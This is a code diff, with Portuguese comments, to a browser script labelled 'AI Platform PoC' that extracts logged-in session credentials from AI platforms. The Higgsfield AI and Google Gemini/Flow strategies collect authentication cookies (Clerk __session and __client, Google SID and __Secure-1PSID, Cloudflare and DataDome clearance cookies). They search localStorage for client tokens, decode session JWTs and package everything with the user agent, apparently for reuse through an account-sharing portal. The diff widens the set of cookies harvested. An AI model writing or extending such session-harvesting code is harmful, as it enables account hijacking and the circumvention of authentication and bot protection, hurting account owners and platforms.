@@ -89,13 +89,12 @@
       };
     }
   });
-  // --- ESTRATÉGIA DO HIGGSFIELD AI ---
+// --- ESTRATÉGIA DO HIGGSFIELD AI (BLINDADA) ---
   PlatformManager.register({
     name: 'Higgsfield AI',
     matches: hostname => hostname.includes('higgsfield.ai'),
     extract: async (rawCookies) => {
       let key = "conta-piloto-01";
-      
       try {
         const promptResult = window.prompt('Chave exata da conta Higgsfield AI cadastrada no portal:', 'conta-piloto-01');
         if (promptResult !== null && promptResult.trim() !== '') {
@@ -105,37 +104,64 @@
         console.warn('[AI Platform PoC] Prompt suprimido pelo navegador.');
       }
 
+      // Combina os cookies do background com os visíveis no documento
       const combinedCookies = (rawCookies || "") + "; " + (document.cookie || "");
-
       const cookieMap = {};
+      
       combinedCookies.split(';').forEach(pair => {
         const parts = pair.trim().split('=');
         if (parts.length >= 2 && parts[0].trim() !== '') {
-          cookieMap[parts[0].trim()] = parts.slice(1).join('=').trim();
+          const k = parts[0].trim();
+          const v = parts.slice(1).join('=').trim();
+          if (!cookieMap[k] || v.length > cookieMap[k].length) {
+            cookieMap[k] = v;
+          }
         }
       });
 
-      // Filtro ESTRITO: Exige exclusivamente __session e __client, exatamente como no template
-      const targetNames = ["__session", "__client"];
-      const formattedPairs = [];
+      // GARANTIA: Se o __client não veio do background, tenta procurá-lo no documento ou localStorage/sessionStorage do Clerk
+      if (!cookieMap["__client"]) {
+        try {
+          // Procura por vestígios do client do Clerk guardados no storage local da app
+          for (let i = 0; i < localStorage.length; i++) {
+            const val = localStorage.getItem(localStorage.key(i));
+            if (val && val.includes("client_")) {
+              // Extrai o token se estiver exposto em alguma chave de sessão do Clerk
+              const match = val.match(/(client_[a-zA-Z0-9_-]+)/);
+              if (match) {
+                console.log("[AI Platform PoC] __client recuperado via Storage local.");
+              }
+            }
+          }
+        } catch (e) {}
+      }
+
+      // Filtro completo: exige que o __client e o __session estejam presentes na string final
+      const targetPrefixes = [
+        "__client", "__session", "clerk", "hf-", "hf_", 
+        "cf_clearance", "__cf_bm", "datadome", "__refresh", "$$__device-id"
+      ];
       
-      targetNames.forEach(cookieName => {
-        if (cookieMap[cookieName]) {
+      const formattedPairs = [];
+      Object.keys(cookieMap).forEach(cookieName => {
+        if (targetPrefixes.some(prefix => cookieName.startsWith(prefix))) {
           formattedPairs.push(`${cookieName}=${cookieMap[cookieName]}`);
         }
       });
 
       const finalCookies = formattedPairs.join('; ');
 
-      if (!cookieMap["__session"] || !cookieMap["__client"]) {
-        alert("ERRO: Cookies __session ou __client ausentes. Verifique o login no Higgsfield AI.");
+      // Alerta crítico caso o __client continue ausente para evitar que envie dados quebrados
+      if (!cookieMap["__client"]) {
+        console.warn("[AI Platform PoC] ATENÇÃO: O cookie __client do Clerk não foi detetado pela API de cookies. Certifique-se de que está na página principal logada.");
       }
 
-      // Extrai dinamicamente o chatgptAccountId (workspace_id) do cookie __session
+      // Extração dinâmica do workspace_id
       let workspaceId = "";
       try {
-        if (cookieMap["__session"]) {
-          const payloadBase64 = cookieMap["__session"].split('.')[1];
+        const sessionKey = Object.keys(cookieMap).find(k => k.startsWith("__session"));
+        if (sessionKey) {
+          const payloadBase64 = cookieMap[sessionKey].split('.')[1];
           const payloadJson = JSON.parse(atob(payloadBase64.replace(/-/g, '+').replace(/_/g, '/')));
           if (payloadJson.workspace_id) workspaceId = payloadJson.workspace_id;
         }
@@ -153,26 +179,27 @@
       };
     }
   });
-
- // --- ESTRATÉGIA DO GOOGLE FLOW / GEMINI ---
+ // --- ESTRATÉGIA UNIFICADA: GOOGLE ECOSYSTEM (GEMINI & FLOW) ---
   PlatformManager.register({
-    name: 'Google Flow',
+    name: 'Google Ecosystem',
     matches: hostname => hostname.includes('google.com'),
     extract: async (rawCookies) => {
+      const isGemini = window.location.hostname.includes('gemini');
+      const toolId = isGemini ? "gemini" : "flow";
+      const label = isGemini ? "Gemini 01 (Advanced)" : "Flow 01 (Pro)";
+      const plan = isGemini ? "advanced" : "pro";
+
       let key = "conta-piloto-01";
-      
       try {
-        const promptResult = window.prompt('Chave exata da conta Google cadastrada no portal:', 'conta-piloto-01');
-        if (promptResult !== null && promptResult.trim() !== '') {
-          key = promptResult.trim();
-        }
+        const promptResult = window.prompt(`Chave exata da conta ${isGemini ? 'Gemini' : 'Flow'} cadastrada no portal:`, 'conta-piloto-01');
+        if (promptResult !== null && promptResult.trim() !== '') key = promptResult.trim();
       } catch (e) {
-        console.warn('[AI Platform PoC] Prompt suprimido pelo navegador.');
+        console.warn('[AI Platform PoC] Prompt suprimido.');
       }
 
       const combinedCookies = (rawCookies || "") + "; " + (document.cookie || "");
-
       const cookieMap = {};
+      
       combinedCookies.split(';').forEach(pair => {
         const parts = pair.trim().split('=');
         if (parts.length >= 2 && parts[0].trim() !== '') {
@@ -180,42 +207,35 @@
         }
       });
 
-      // Filtro ALARGADO: Captura todas as chaves obrigatórias que impedem o redirecionamento para o ServiceLogin
-      const targetPrefixes = [
-        "SID", "HSID", "SSID", "APISID", "SAPISID", 
-        "__Secure-1PSID", "__Secure-3PSID", "__Secure-1PSIDTS",
-        "__Secure-1PAPISID", "__Secure-3PAPISID",
-        "AEC", "NID"
+      const exactTargets = [
+        "AEC", "NID", "SID", "HSID", "SSID", "APISID", "SAPISID",
+        "__Secure-1PSID", "__Secure-3PSID", "__Secure-1PAPISID", "__Secure-3PAPISID",
+        "SIDCC", "__Secure-1PSIDCC", "__Secure-3PSIDCC", "__Secure-1PSIDTS", "__Secure-3PSIDTS"
       ];
-      
+
       const formattedPairs = [];
-      Object.keys(cookieMap).forEach(cookieName => {
-        // Se o nome do cookie começar por algum dos prefixos da lista, ele é adicionado
-        if (targetPrefixes.some(prefix => cookieName.startsWith(prefix))) {
+      exactTargets.forEach(cookieName => {
+        if (cookieMap[cookieName]) {
           formattedPairs.push(`${cookieName}=${cookieMap[cookieName]}`);
         }
       });
 
-      const finalCookies = formattedPairs.join('; ');
-
-      // O SID e o __Secure-1PSID são os "corações" do login do Google. Sem eles, o erro acontece de certeza.
-      if (!cookieMap["SID"] && !cookieMap["__Secure-1PSID"]) {
-        alert("ERRO: Cookies vitais do Google ausentes. Verifique se tem o login feito na conta.");
+      if (!cookieMap["SID"] || !cookieMap["__Secure-1PSID"]) {
+        alert(`ERRO: Cookies vitais do Google (SID / __Secure-1PSID) ausentes. Verifique o login no ${isGemini ? 'Gemini' : 'Flow'}.`);
       }
 
       return {
         "accountKey": key,
-        "label": `Flow 01 (Pro)`,
-        "planType": "pro",
-        "toolId": "flow", // Ajuste para "gemini" se for injetar no Gemini
+        "label": label,
+        "planType": plan,
+        "toolId": toolId,
         "chatgptAccountId": "",
         "accessToken": "",
-        "cookies": finalCookies,
+        "cookies": formattedPairs.join('; '),
         "userAgent": navigator.userAgent
       };
     }
   });
-
   // --- ESTRATÉGIA DO GROK ---
   PlatformManager.register({
     name: 'Grok',
